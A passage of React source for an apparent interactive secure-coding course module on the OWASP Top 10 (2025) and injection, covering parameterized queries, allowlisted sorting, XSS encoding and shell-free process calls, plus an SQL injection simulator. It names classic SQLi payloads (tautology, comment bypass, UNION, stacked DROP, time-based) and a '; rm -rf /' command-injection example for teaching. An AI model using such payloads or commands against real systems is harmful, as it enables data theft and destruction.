                      <CheckCircle2 className="w-4 h-4 text-orange-600 shrink-0 mt-0.5" />
                      <span>Explain the scope and limitations of the OWASP Top 10 framework.</span>
                    </div>
                    <div className="flex items-start space-x-2">
                      <CheckCircle2 className="w-4 h-4 text-orange-600 shrink-0 mt-0.5" />
                      <span>Identify the 10 risk categories in the OWASP Top 10: 2025 edition.</span>
                    </div>
                    <div className="flex items-start space-x-2">
                      <CheckCircle2 className="w-4 h-4 text-orange-600 shrink-0 mt-0.5" />
                      <span>Distinguish validation, output encoding, sanitization, parameterization & authorization.</span>
                    </div>
                    <div className="flex items-start space-x-2">
                      <CheckCircle2 className="w-4 h-4 text-orange-600 shrink-0 mt-0.5" />
                      <span>Trace how injection occurs when untrusted data mutates interpreter instructions.</span>
                    </div>
                    <div className="flex items-start space-x-2">
                      <CheckCircle2 className="w-4 h-4 text-orange-600 shrink-0 mt-0.5" />
                      <span>Deconstruct SQLi, XSS, Command Injection, NoSQLi, and SSTI patterns.</span>
                    </div>
                    <div className="flex items-start space-x-2">
                      <CheckCircle2 className="w-4 h-4 text-orange-600 shrink-0 mt-0.5" />
                      <span>Deploy parameterized prepared statements and context-aware encoders.</span>
                    </div>
                    <div className="flex items-start space-x-2">
                      <CheckCircle2 className="w-4 h-4 text-orange-600 shrink-0 mt-0.5" />
                      <span>Enforce schema-based validation across all application trust boundaries.</span>
                    </div>
                    <div className="flex items-start space-x-2">
                      <CheckCircle2 className="w-4 h-4 text-orange-600 shrink-0 mt-0.5" />
                      <span>Build automated regression test suites proving injection resilience.</span>
                    </div>
                  </div>
                </div>
              </section>
              )}

              {/* 14.2 OWASP Top 10: 2025 Edition */}
              {selectedTopic === 2 && (
              <section id="section-2" className="space-y-6 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <Award className="w-4 h-4" />
                  <span>14.2 OWASP & THE OWASP TOP 10 (2025 EDITION)</span>
                </div>
                <h2 className="text-xl font-bold text-stone-900">
                  Authoritative Risk Categories & Threat Landscape
                </h2>
                <p className="text-stone-700 text-sm leading-relaxed">
                  The OWASP Foundation is a global nonprofit providing standards and guidance. The
                  OWASP Top 10 is an awareness document summarizing prominent risk categories. It is
                  not an exhaustive checklist or a substitute for a comprehensive risk assessment. The
                  2025 edition is the current authoritative baseline.
                </p>

                {/* OWASP Top 10 2025 Table */}
                <div className="overflow-x-auto border border-stone-200 rounded-xl">
                  <table className="w-full text-left text-xs">
                    <thead className="bg-stone-50/90 text-stone-700 uppercase font-mono border-b border-stone-200">
                      <tr>
                        <th className="p-3">Rank</th>
                        <th className="p-3">Category</th>
                        <th className="p-3">Core Vulnerability Scope</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-800/60 text-stone-700">
                      <tr className="hover:bg-stone-50/40">
                        <td className="p-3 font-mono font-bold text-orange-600">A01</td>
                        <td className="p-3 font-semibold text-white">Broken Access Control</td>
                        <td className="p-3">Users performing actions or accessing resources beyond their permitted boundaries (BOLA/IDOR).</td>
                      </tr>
                      <tr className="hover:bg-stone-50/40">
                        <td className="p-3 font-mono font-bold text-orange-600">A02</td>
                        <td className="p-3 font-semibold text-white">Security Misconfiguration</td>
                        <td className="p-3">Unsafe defaults, exposed administrative interfaces, unhardened cloud settings, verbose errors.</td>
                      </tr>
                      <tr className="hover:bg-stone-50/40">
                        <td className="p-3 font-mono font-bold text-orange-600">A03</td>
                        <td className="p-3 font-semibold text-white">Software Supply Chain Failures</td>
                        <td className="p-3">Compromised third-party packages, vulnerable dependencies, unverified build pipelines.</td>
                      </tr>
                      <tr className="hover:bg-stone-50/40">
                        <td className="p-3 font-mono font-bold text-orange-600">A04</td>
                        <td className="p-3 font-semibold text-white">Cryptographic Failures</td>
                        <td className="p-3">Weak algorithms, plaintext transmission, insecure key management, nonce reuse in AEAD.</td>
                      </tr>
                      <tr className="hover:bg-stone-50/40 bg-cyan-950/20">
                        <td className="p-3 font-mono font-bold text-orange-700">A05</td>
                        <td className="p-3 font-semibold text-orange-700">Injection</td>
                        <td className="p-3 text-cyan-200">Untrusted input interpreted as commands, queries, templates, or active code (Focus of this module).</td>
                      </tr>
                      <tr className="hover:bg-stone-50/40">
                        <td className="p-3 font-mono font-bold text-orange-600">A06</td>
                        <td className="p-3 font-semibold text-white">Insecure Design</td>
                        <td className="p-3">Flaws in threat modeling, architectural logic, and lack of pre-implementation security patterns.</td>
                      </tr>
                      <tr className="hover:bg-stone-50/40">
                        <td className="p-3 font-mono font-bold text-orange-600">A07</td>
                        <td className="p-3 font-semibold text-white">Authentication Failures</td>
                        <td className="p-3">Weak credentials, missing MFA, session fixation, credential stuffing, flawed token lifecycles.</td>
                      </tr>
                      <tr className="hover:bg-stone-50/40">
                        <td className="p-3 font-mono font-bold text-orange-600">A08</td>
                        <td className="p-3 font-semibold text-white">Software or Data Integrity Failures</td>
                        <td className="p-3">Unsafe deserialization, auto-updating code without cryptographic signature verification.</td>
                      </tr>
                      <tr className="hover:bg-stone-50/40">
                        <td className="p-3 font-mono font-bold text-orange-600">A09</td>
                        <td className="p-3 font-semibold text-white">Security Logging and Alerting Failures</td>
                        <td className="p-3">Silent compromises, missing audit trails, unmonitored authentication alerts, lack of log integrity.</td>
                      </tr>
                      <tr className="hover:bg-stone-50/40">
                        <td className="p-3 font-mono font-bold text-orange-600">A10</td>
                        <td className="p-3 font-semibold text-white">Mishandling of Exceptional Conditions</td>
                        <td className="p-3">Failing open on exceptions, exposing stack traces, unhandled edge cases in control flow.</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </section>
              )}

              {/* 14.3 Understanding the Injection Vulnerability Class */}
              {selectedTopic === 3 && (
              <section id="section-3" className="space-y-6 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <Bug className="w-4 h-4" />
                  <span>14.3 THE INJECTION VULNERABILITY CLASS</span>
                </div>
                <h2 className="text-xl font-bold text-stone-900">
                  The Fundamental Failure: Data Mutating Instruction Structure
                </h2>
                <p className="text-stone-700 text-sm leading-relaxed">
                  Injection occurs when an application allows untrusted data to alter the intended
                  structure or meaning of an instruction processed by another component. The receiving
                  interpreter may be a SQL database, NoSQL engine, OS shell, template compiler, or
                  browser HTML engine.
                </p>

                {/* 4 Steps Diagram */}
                <div className="grid grid-cols-1 sm:grid-cols-4 gap-3 text-xs text-center">
                  <div className="p-3 rounded-xl bg-white border border-stone-200/80 shadow-xs">
                    <div className="text-orange-600 font-bold font-mono">1. Untrusted Input</div>
                    <p className="text-stone-600 mt-1">Data arrives from form, URL query, JSON body, or header.</p>
                  </div>
                  <div className="p-3 rounded-xl bg-white border border-stone-200/80 shadow-xs">
                    <div className="text-amber-400 font-bold font-mono">2. Unsafe Concat</div>
                    <p className="text-stone-600 mt-1">App interpolates raw data directly into instruction syntax.</p>
                  </div>
                  <div className="p-3 rounded-xl bg-white border border-stone-200/80 shadow-xs">
                    <div className="text-rose-400 font-bold font-mono">3. AST Mutated</div>
                    <p className="text-stone-600 mt-1">Interpreter grammar interprets input characters as active commands.</p>
                  </div>
                  <div className="p-3 rounded-xl bg-white border border-stone-200/80 shadow-xs">
                    <div className="text-orange-600 font-bold font-mono">4. Exploit Executed</div>
                    <p className="text-stone-600 mt-1">Data leakage, authentication bypass, or system compromise.</p>
                  </div>
                </div>

                <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 space-y-2 text-xs">
                  <h4 className="font-bold text-white">Distinguishing Security Boundaries</h4>
                  <ul className="space-y-1.5 text-stone-700 list-disc list-inside">
                    <li>
                      <strong>Input Validation:</strong> Verifies format, length, type, and schema. <em>Does not alone stop injection if concatenation is used!</em>
                    </li>
                    <li>
                      <strong>Parameterization:</strong> Keeps data strictly separate from instruction syntax at the driver layer.
                    </li>
                    <li>
                      <strong>Contextual Output Encoding:</strong> Escapes characters specifically for the destination sink (HTML body, attribute, JS, URL).
                    </li>
                    <li>
                      <strong>Authorization:</strong> Ensures the authenticated session has permission to access the resolved record.
                    </li>
                  </ul>
                </div>
              </section>
              )}

              {/* 14.4 SQL Injection (SQLi) */}
              {selectedTopic === 4 && (
              <section id="section-4" className="space-y-6 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <Database className="w-4 h-4" />
                  <span>14.4 SQL INJECTION (SQLI) IN-DEPTH</span>
                </div>
                <h2 className="text-xl font-bold text-stone-900">
                  Prepared Statements, Dynamic Sorting & Least Privilege
                </h2>
                <p className="text-stone-700 text-sm leading-relaxed">
                  SQL injection occurs when user-controlled data alters an SQL statement. It can leak
                  confidential records, bypass authentication, modify data, and execute destructive operations.
                </p>

                {/* Common SQLi Patterns Table */}
                <div className="overflow-x-auto border border-stone-200 rounded-xl">
                  <table className="w-full text-left text-xs">
                    <thead className="bg-stone-50/90 text-stone-700 uppercase font-mono border-b border-stone-200">
                      <tr>
                        <th className="p-3">Pattern</th>
                        <th className="p-3">Mechanics</th>
                        <th className="p-3">Defensive Countermeasure</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-800/60 text-stone-700">
                      <tr className="hover:bg-stone-50/40">
                        <td className="p-3 font-bold text-orange-600">In-Band (Error / UNION)</td>
                        <td className="p-3">Attacker extracts data or triggers database syntax errors directly in HTTP response.</td>
                        <td className="p-3">Parameterized prepared statements; disable verbose database error disclosure.</td>
                      </tr>
                      <tr className="hover:bg-stone-50/40">
                        <td className="p-3 font-bold text-orange-600">Boolean-Based Blind</td>
                        <td className="p-3">Application reveals true/false differences in page content based on injected predicates.</td>
                        <td className="p-3">Separate query structure from values via driver parameter binding.</td>
                      </tr>
                      <tr className="hover:bg-stone-50/40">
                        <td className="p-3 font-bold text-orange-600">Time-Based Blind</td>
                        <td className="p-3">Attacker injects sleep functions (e.g., pg_sleep) to infer data character-by-character.</td>
                        <td className="p-3">Universal parameterization; query timeout caps at the database pool level.</td>
                      </tr>
                      <tr className="hover:bg-stone-50/40">
                        <td className="p-3 font-bold text-orange-600">Second-Order SQLi</td>
                        <td className="p-3">Malicious payload stored safely in DB, then later concatenated into a secondary query.</td>
                        <td className="p-3">Parameterize every query across the entire lifecycle; never trust internal DB records.</td>
                      </tr>
                      <tr className="hover:bg-stone-50/40">
                        <td className="p-3 font-bold text-orange-600">Dynamic Sorting Hazard</td>
                        <td className="p-3">User controls column name in ORDER BY clause (cannot be parameterized by SQL drivers).</td>
                        <td className="p-3">Map user inputs to a strict hardcoded allowlist dictionary on the backend.</td>
                      </tr>
                    </tbody>
                  </table>
                </div>

                {/* Dynamic Sorting Code Example */}
                <div className="bg-stone-50 border border-stone-200/80 rounded-xl p-4 font-mono text-xs space-y-2">
                  <div className="text-orange-600 font-bold flex items-center justify-between">
                    <span>Safe Dynamic Sorting Pattern (Allowlist Mapping)</span>
                    <button
                      onClick={() =>
                        copyCode(
                          `const ALLOWED_COLUMNS = { date: "created_at", score: "interview_score", name: "candidate_name" };\nconst sortColumn = ALLOWED_COLUMNS[req.query.sort] ?? "created_at";\nconst sortDir = req.query.dir === "desc" ? "DESC" : "ASC";\nconst sql = \`SELECT * FROM interviews WHERE user_id = $1 ORDER BY \${sortColumn} \${sortDir}\`;`,
                          "sort_code"
                        )
                      }
                      className="text-stone-600 hover:text-white flex items-center space-x-1"
                    >
                      {copiedCodeId === "sort_code" ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5 text-orange-600" />}
                      <span>{copiedCodeId === "sort_code" ? "Copied" : "Copy"}</span>
                    </button>
                  </div>
                  <pre className="text-stone-700 text-[11px] overflow-x-auto">
{`const ALLOWED_COLUMNS = {
  date: "created_at",
  score: "interview_score",
  name: "candidate_name"
};
// Map client request strictly to fixed developer-defined identifiers
const sortColumn = ALLOWED_COLUMNS[req.query.sort] ?? "created_at";
const sortDir = req.query.dir === "desc" ? "DESC" : "ASC";

// Safe: column and direction are strictly derived from hardcoded allowlist values
const sql = \`SELECT * FROM interviews WHERE user_id = $1 ORDER BY \${sortColumn} \${sortDir}\`;
const result = await db.query(sql, [authenticatedUserId]);`}
                  </pre>
                </div>
              </section>
              )}

              {/* 14.5 XSS & Output Handling */}
              {selectedTopic === 5 && (
              <section id="section-5" className="space-y-6 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <FileCode className="w-4 h-4" />
                  <span>14.5 CROSS-SITE SCRIPTING (XSS) & CONTEXTUAL ENCODING</span>
                </div>
                <h2 className="text-xl font-bold text-stone-900">
                  Context-Aware Output Encoding & Safe DOM APIs
                </h2>
                <p className="text-stone-700 text-sm leading-relaxed">
                  XSS occurs when untrusted data is interpreted as active code in a browser. Encoding
                  must match the exact sink context where the data is rendered.
                </p>

                {/* Context-Aware Matrix */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 space-y-2">
                    <div className="font-bold text-orange-700">1. HTML Body Text Context</div>
                    <p className="text-stone-700">
                      Standard text between tags (<code className="font-mono text-orange-600">&lt;div&gt;...&lt;/div&gt;</code>).
                    </p>
                    <div className="bg-slate-950 p-2 rounded text-[11px] text-stone-700 font-mono">
                      Safe: element.textContent = input; or HTML entity encoding (&amp;lt; &amp;gt; &amp;amp;)
                    </div>
                  </div>

                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 space-y-2">
                    <div className="font-bold text-amber-300">2. HTML Attribute Context</div>
                    <p className="text-stone-700">
                      Inside tag quotes (<code className="font-mono text-amber-400">&lt;input value=&quot;...&quot;&gt;</code>).
                    </p>
                    <div className="bg-slate-950 p-2 rounded text-[11px] text-stone-700 font-mono">
                      Safe: Quote values and encode quotes (&amp;quot; &amp;#39;). HTML escaping alone fails!
                    </div>
                  </div>

                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 space-y-2">
                    <div className="font-bold text-orange-700">3. JavaScript Execution Context</div>
                    <p className="text-stone-700">
                      Inside script tags (<code className="font-mono text-orange-600">&lt;script&gt;var id = ...&lt;/script&gt;</code>).
                    </p>
                    <div className="bg-slate-950 p-2 rounded text-[11px] text-stone-700 font-mono">
                      Safe: Serialize via JSON.stringify() or pass data via data-* attributes and read via dataset.
                    </div>
                  </div>

                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 space-y-2">
                    <div className="font-bold text-rose-300">4. URL / Href Context</div>
                    <p className="text-stone-700">
                      Inside links (<code className="font-mono text-rose-400">&lt;a href=&quot;...&quot;&gt;</code>).
                    </p>
                    <div className="bg-slate-950 p-2 rounded text-[11px] text-stone-700 font-mono">
                      Safe: Protocol allowlist (https:, http:, mailto:). Reject javascript: and data: URIs!
                    </div>
                  </div>
                </div>
              </section>
              )}

              {/* 14.6 Command Injection */}
              {(selectedTopic === 6 || selectedTopic === 7 || selectedTopic === 8 || selectedTopic === 9 || selectedTopic === 10) && (
              <section id="section-6" className="space-y-6 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <Terminal className="w-4 h-4" />
                  <span>14.6 OS COMMAND & ARGUMENT INJECTION</span>
                </div>
                <h2 className="text-xl font-bold text-stone-900">
                  Safe Process APIs, Disabling Shells & Argument Arrays
                </h2>
                <p className="text-stone-700 text-sm leading-relaxed">
                  When web applications execute system utilities (e.g. video processing with ffmpeg,
                  PDF generation with pandoc), interpolating user input into shell strings allows
                  shell metacharacters to spawn secondary commands.
                </p>

                <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 space-y-3 text-xs leading-relaxed">
                  <h4 className="font-bold text-orange-700">The 4-Step OS Command Defense Rulebook:</h4>
                  <p>
                    1. <strong>Avoid the Shell:</strong> Prefer in-process standard libraries over launching system executables.
                  </p>
                  <p>
                    2. <strong>Disable Shell Interpretation:</strong> Use <code className="font-mono text-emerald-400">execFile()</code> or <code className="font-mono text-emerald-400">spawn()</code> with <code className="font-mono text-emerald-400">&#123; shell: false &#125;</code> and pass arguments as discrete array elements.
                  </p>
                  <p>
                    3. <strong>Watch for Argument Injection:</strong> Disabling the shell prevents chained commands (<code className="font-mono">; rm -rf /</code>), but an input starting with <code className="font-mono">--output=/path</code> can still trick the binary. Whitelist argument values.
                  </p>
                  <p>
                    4. <strong>Apply Least Privilege:</strong> Run the backend process under an unprivileged system user account with restricted filesystem permissions.
                  </p>
                </div>
              </section>
              )}

              {/* 14.11 Secure Input-Handling Engineering */}
              {(selectedTopic === 11 || selectedTopic === 12) && (
              <section id="section-11" className="space-y-6 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <ShieldCheck className="w-4 h-4" />
                  <span>14.11 SECURE INPUT-HANDLING ENGINEERING</span>
                </div>
                <h2 className="text-xl font-bold text-stone-900">
                  Trust Boundaries, Schema Validation & Defensive Logging
                </h2>
                <p className="text-stone-700 text-sm leading-relaxed">
                  Input validation checks whether data conforms to structural and semantic business
                  invariants. It must be enforced at every trust boundary without relying on client checks.
                </p>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-4 space-y-2">
                    <div className="font-bold text-orange-700">Syntax Validation</div>
                    <p className="text-stone-700">
                      Validates structural shape: data type (integer), string length, UUID format, regex email pattern.
                    </p>
                  </div>
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-4 space-y-2">
                    <div className="font-bold text-amber-300">Semantic Validation</div>
                    <p className="text-stone-700">
                      Validates business meaning: interview start time is before end time; requester owns the target report.
                    </p>
                  </div>
                </div>
              </section>
              )}

              {/* 14.13 Practical Lab Workspace */}
              {selectedTopic === 13 && (
              <section id="section-13" className="space-y-6 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <TerminalSquare className="w-4 h-4" />
                  <span>14.13 PRACTICAL LAB DELIVERABLE</span>
                </div>
                <h2 className="text-xl font-bold text-stone-900">
                  Injection Assessment Report Generator (OWASP Juice Shop Standard)
                </h2>
                <p className="text-stone-700 text-sm leading-relaxed">
                  Document your security assessment findings from Exercises A through E in accordance
                  with professional application security testing reporting standards.
                </p>

                {/* Report Generator Box */}
                <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-5 space-y-4">
                  <div className="flex items-center justify-between border-b border-stone-200 pb-3">
                    <div className="flex items-center space-x-2">
                      <FileSpreadsheet className="w-5 h-5 text-orange-600" />
                      <h4 className="text-sm font-bold text-stone-900">Injection Assessment Report Generator</h4>
                    </div>
                    <button
                      onClick={copyLabReport}
                      className="px-3 py-1.5 rounded-lg bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold text-xs flex items-center space-x-1.5 transition"
                    >
                      {reportCopied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                      <span>{reportCopied ? "Report Copied!" : "Copy Lab Report"}</span>
                    </button>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
                    <div>
                      <label className="text-stone-600 block mb-1 font-semibold">Scope & Environment</label>
                      <input
                        type="text"
                        value={labScope}
                        onChange={(e) => setLabScope(e.target.value)}
                        className="w-full bg-stone-50 border border-stone-200/80 rounded px-2.5 py-1.5 text-stone-800 font-mono"
                      />
                    </div>
                    <div>
                      <label className="text-stone-600 block mb-1 font-semibold">Finding Title</label>
                      <input
                        type="text"
                        value={labFinding}
                        onChange={(e) => setLabFinding(e.target.value)}
                        className="w-full bg-stone-50 border border-stone-200/80 rounded px-2.5 py-1.5 text-stone-800 font-mono"
                      />
                    </div>
                    <div>
                      <label className="text-stone-600 block mb-1 font-semibold">Root Cause Analysis</label>
                      <textarea
                        rows={2}
                        value={labRootCause}
                        onChange={(e) => setLabRootCause(e.target.value)}
                        className="w-full bg-stone-50 border border-stone-200/80 rounded p-2 text-stone-800 font-mono text-[11px]"
                      />
                    </div>
                    <div>
                      <label className="text-stone-600 block mb-1 font-semibold">Realistic Impact</label>
                      <textarea
                        rows={2}
                        value={labImpact}
                        onChange={(e) => setLabImpact(e.target.value)}
                        className="w-full bg-stone-50 border border-stone-200/80 rounded p-2 text-stone-800 font-mono text-[11px]"
                      />
                    </div>
                    <div>
                      <label className="text-stone-600 block mb-1 font-semibold">Remediation Code Change</label>
                      <textarea
                        rows={2}
                        value={labRemediation}
                        onChange={(e) => setLabRemediation(e.target.value)}
                        className="w-full bg-stone-50 border border-stone-200/80 rounded p-2 text-stone-800 font-mono text-[11px]"
                      />
                    </div>
                    <div>
                      <label className="text-stone-600 block mb-1 font-semibold">Verification & Regression Test</label>
                      <textarea
                        rows={2}
                        value={labVerification}
                        onChange={(e) => setLabVerification(e.target.value)}
                        className="w-full bg-stone-50 border border-stone-200/80 rounded p-2 text-stone-800 font-mono text-[11px]"
                      />
                    </div>
                  </div>
                </div>
              </section>
              )}

              {/* 14.15 Official References */}
              {selectedTopic === 15 && (
              <section id="section-15" className="space-y-4 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <BookOpen className="w-4 h-4" />
                  <span>14.15 OFFICIAL REFERENCES & DOCUMENTATION</span>
                </div>
                <h2 className="text-xl font-bold text-stone-900">
                  Authoritative Guidance & Security Standards
                </h2>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
                  <a
                    href="https://owasp.org/Top10/2025/"
                    target="_blank"
                    rel="noreferrer"
                    className="p-3.5 rounded-xl bg-white border border-stone-200/80 shadow-xs hover:border-cyan-500/50 transition block space-y-1 group"
                  >
                    <div className="font-bold text-stone-900 group-hover:text-orange-700 flex items-center justify-between">
                      <span>OWASP Top 10: 2025 Official Standard</span>
                      <ExternalLink className="w-3.5 h-3.5" />
                    </div>
                    <p className="text-stone-600 text-[11px]">
                      The official risk categories, including A05: Injection and A01: Broken Access Control.
                    </p>
                  </a>
                  <a
                    href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
                    target="_blank"
                    rel="noreferrer"
                    className="p-3.5 rounded-xl bg-white border border-stone-200/80 shadow-xs hover:border-cyan-500/50 transition block space-y-1 group"
                  >
                    <div className="font-bold text-stone-900 group-hover:text-orange-700 flex items-center justify-between">
                      <span>SQL Injection Prevention Cheat Sheet</span>
                      <ExternalLink className="w-3.5 h-3.5" />
                    </div>
                    <p className="text-stone-600 text-[11px]">
                      Prepared statements, safe dynamic sorting allowlists, and stored procedure guidelines.
                    </p>
                  </a>
                  <a
                    href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
                    target="_blank"
                    rel="noreferrer"
                    className="p-3.5 rounded-xl bg-white border border-stone-200/80 shadow-xs hover:border-cyan-500/50 transition block space-y-1 group"
                  >
                    <div className="font-bold text-stone-900 group-hover:text-orange-700 flex items-center justify-between">
                      <span>XSS Prevention & Output Encoding Cheat Sheet</span>
                      <ExternalLink className="w-3.5 h-3.5" />
                    </div>
                    <p className="text-stone-600 text-[11px]">
                      Context-aware output encoding rules for HTML, attribute, script, URL, and CSS contexts.
                    </p>
                  </a>
                  <a
                    href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
                    target="_blank"
                    rel="noreferrer"
                    className="p-3.5 rounded-xl bg-white border border-stone-200/80 shadow-xs hover:border-cyan-500/50 transition block space-y-1 group"
                  >
                    <div className="font-bold text-stone-900 group-hover:text-orange-700 flex items-center justify-between">
                      <span>OS Command Injection Defense Guide</span>
                      <ExternalLink className="w-3.5 h-3.5" />
                    </div>
                    <p className="text-stone-600 text-[11px]">
                      Disabling shell execution, parameterizing argument arrays, and process sandboxing.
                    </p>
                  </a>
                </div>
              </section>
              )}

              {/* 14.16 Key Takeaways */}
              {selectedTopic === 16 && (
              <section id="section-16" className="space-y-4 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <Award className="w-4 h-4" />
                  <span>14.16 KEY ENGINEERING TAKEAWAYS</span>
                </div>
                <h2 className="text-xl font-bold text-stone-900">Summary of Core Principles</h2>
                <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-5 space-y-2.5 text-xs text-stone-700 leading-relaxed">
                  <p>
                    1. <strong>The Injection Invariant:</strong> Injection occurs when untrusted data
                    changes the syntax or meaning of an instruction. The primary defense is keeping data
                    strictly separate from code via parameterized APIs.
                  </p>
                  <p>
                    2. <strong>Validation ≠ Security:</strong> Input validation is essential for data
                    integrity, but it does not replace parameterized queries. A perfectly valid string
                    can still execute SQL injection if concatenated into a query string.
                  </p>
                  <p>
                    3. <strong>Context Dictates Encoding:</strong> HTML encoding does not prevent XSS in
                    JavaScript variables, URL href attributes, or CSS blocks. Match the encoder to the sink.
                  </p>
                  <p>
                    4. <strong>Command Safety:</strong> Avoid the shell. Use process APIs with argument
                    arrays (<code className="font-mono text-orange-700">execFile</code> with <code className="font-mono text-orange-700">shell: false</code>).
                  </p>
                  <p>
                    5. <strong>Defense in Depth:</strong> Combine schema validation, parameterized
                    queries, context-aware output encoding, least-privilege service accounts, and
                    regression tests.
                  </p>
                </div>
              </section>
              )}
            </div>
          )}

          {/* TAB: SIMULATOR 1 - SQLI VS PREPARED STATEMENTS */}
          {activeTab === "sqli-sim" && (
            <div className="space-y-6">
              <div className="flex items-center justify-between border-b border-stone-200 pb-4">
                <div>
                  <h3 className="text-lg font-bold text-stone-900 flex items-center space-x-2">
                    <Database className="w-5 h-5 text-orange-600" />
                    <span>Simulator 1: SQL Injection vs Parameterized Prepared Statements</span>
                  </h3>
                  <p className="text-xs text-stone-600 mt-0.5">
                    Test classic SQL injection payloads against vulnerable string concatenation versus secure parameter binding.
                  </p>
                </div>
                <div className="flex items-center space-x-2">
                  <button
                    onClick={() =>
                      setSqliDefenseMode(
                        sqliDefenseMode === "vulnerable" ? "parameterized" : "vulnerable"
                      )
                    }
                    className={`px-3 py-1.5 rounded-lg border text-xs font-bold transition ${
                      sqliDefenseMode === "parameterized"
                        ? "bg-emerald-950/60 border-emerald-500 text-emerald-300"
                        : "bg-rose-950/60 border-rose-500 text-rose-300 animate-pulse"
                    }`}
                  >
                    Engine: {sqliDefenseMode === "parameterized" ? "PARAMETERIZED ($1)" : "VULNERABLE (CONCAT)"}
                  </button>
                </div>
              </div>

              {/* Payload Selector Buttons */}
              <div className="space-y-2">
                <div className="text-xs font-bold text-stone-700">Select Injected Payload:</div>
                <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2 text-xs">
                  <button
                    onClick={() => setSqliPayloadType("tautology")}
                    className={`p-2 rounded-lg border text-left transition ${
                      sqliPayloadType === "tautology"
                        ? "bg-cyan-950/60 border-cyan-500 text-orange-700 font-bold"
                        : "bg-stone-50 border-stone-200 text-stone-600"
                    }`}
                  >
                    1. &apos; OR &apos;1&apos;=&apos;1 (Tautology)
                  </button>
                  <button
                    onClick={() => setSqliPayloadType("comment")}
                    className={`p-2 rounded-lg border text-left transition ${
                      sqliPayloadType === "comment"
                        ? "bg-cyan-950/60 border-cyan-500 text-orange-700 font-bold"
                        : "bg-stone-50 border-stone-200 text-stone-600"
                    }`}
                  >
                    2. admin&apos; -- (Bypass)
                  </button>
                  <button
                    onClick={() => setSqliPayloadType("union")}
                    className={`p-2 rounded-lg border text-left transition ${
                      sqliPayloadType === "union"
                        ? "bg-cyan-950/60 border-cyan-500 text-orange-700 font-bold"
                        : "bg-stone-50 border-stone-200 text-stone-600"
                    }`}
                  >
                    3. UNION Exfiltration
                  </button>
                  <button
                    onClick={() => setSqliPayloadType("stacked")}
                    className={`p-2 rounded-lg border text-left transition ${
                      sqliPayloadType === "stacked"
                        ? "bg-cyan-950/60 border-cyan-500 text-orange-700 font-bold"
                        : "bg-stone-50 border-stone-200 text-stone-600"
                    }`}
                  >
                    4. Stacked (DROP)
                  </button>
                  <button
                    onClick={() => setSqliPayloadType("time_blind")}
                    className={`p-2 rounded-lg border text-left transition ${
                      sqliPayloadType === "time_blind"
                        ? "bg-cyan-950/60 border-cyan-500 text-orange-700 font-bold"
                        : "bg-stone-50 border-stone-200 text-stone-600"
                    }`}
                  >
                    5. Time-Based Blind
                  </button>
                  <button
                    onClick={() => setSqliPayloadType("benign")}
                    className={`p-2 rounded-lg border text-left transition ${
                      sqliPayloadType === "benign"
                        ? "bg-cyan-950/60 border-cyan-500 text-orange-700 font-bold"
                        : "bg-stone-50 border-stone-200 text-stone-600"
                    }`}
                  >
                    6. Benign Input
                  </button>
                </div>
              </div>

              {/* Query Dissector View */}
              <div className="bg-stone-50 border border-stone-200/80 rounded-xl p-4 font-mono text-xs space-y-2">
                <div className="text-orange-600 font-bold border-b border-stone-200 pb-1 flex items-center justify-between">
                  <span>Constructed Database Query Stream</span>
                  <span className="text-[11px] text-stone-600">
                    AST Status: {sqliSimulation.astMutated ? "MUTATED (HIJACKED)" : "STABLE & FIXED"}
                  </span>
                </div>
                <pre className="text-stone-700 text-[11px] overflow-x-auto whitespace-pre-wrap">
                  {sqliSimulation.constructedQuery}
                </pre>
              </div>

              {/* Execution Outcome Box */}
              <div
                className={`p-5 rounded-xl border text-xs space-y-3 ${
                  sqliSimulation.securityGrade === "EXPLOITED"
                    ? "bg-rose-950/30 border-rose-800/80 text-rose-200"
                    : "bg-emerald-950/30 border-emerald-800/80 text-emerald-200"
                }`}
              >
                <div className="flex items-center justify-between">
                  <span className="font-bold text-sm flex items-center space-x-2">
                    {sqliSimulation.securityGrade === "EXPLOITED" ? (
